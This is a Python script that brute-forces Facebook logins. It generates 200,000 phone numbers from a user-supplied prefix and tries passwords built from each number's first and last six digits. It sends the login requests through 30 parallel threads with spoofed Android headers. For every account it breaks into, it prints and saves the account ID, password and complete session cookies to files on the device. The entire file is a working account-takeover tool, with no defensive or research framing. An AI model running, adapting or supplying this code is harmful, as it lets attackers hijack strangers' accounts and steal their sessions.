import os,re,sys,uuid,random,time,json,base64,subprocess,shutil,string, requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool




loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""
az_string = string.ascii_uppercase



def main():
    user=[]
    os.system("clear")
    print(logo)
    pwx=["first6","last6"]
    print("—"*30)
    print(" CODE: 0171 0181 082 067")
    print("—"*30)
    code=input("[!] -->")

    met=""
    
    
    for i in range(200000):
        gg=str(random.choice(range(1000000,9999999)))
        user.append(gg)
    with ThreadPool(max_workers=30) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        print("  Used Code "+code)
        print("—"*30)
        for xd in user:
            uid=code+xd
            update.submit(host,uid,pwx,met)

def fbDomin(met):
    if "1" in met:
        return "mbasic.facebook.com"
    elif "2" in met:
        return "p.facebook.com"
    elif "3" in met:
        return "m.facebook.com"
    elif "4" in met:
        return "touch.facebook.com"
    elif "5" in met:
        return "free.facebook.com"
    else:
        return "x.facebook.com"


session_token="YT"
usershow="TESTING"




def host(uid,pwx,met):
    global oks,loop
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[TESTING]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    try:
        
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            session=requests.session()
            link=session.get("https://mbasic.facebook.com/").text
            rr=random.randint
            data={
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': 'p',
            '__hs': '20156.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1020727961',
            '__s': ':i9p1qu:mahlv2',
            '__hsi': '7479797114083238570',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
            '__csr': '',
            '__hsdp': '',
            '__hblp': '',
            'fb_dtsg': 'NAcNUIYwJi18an1KNSKvDEsLdLTDlQVpg1Vud66BoblVCSXRf0aNVow:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+ps+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23090RA98G"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',}
            session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',headers=headers, data=data).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0]
                print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}")
                oks.append(xd)
                nonvx=session.cookies.get_dict()["xs"][-2:]
                if nonvx in ["-1"]:
                    open("/sdcard/svg_novery.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                else:
                    open("/sdcard/svg_test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                
                break
            
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass




main()
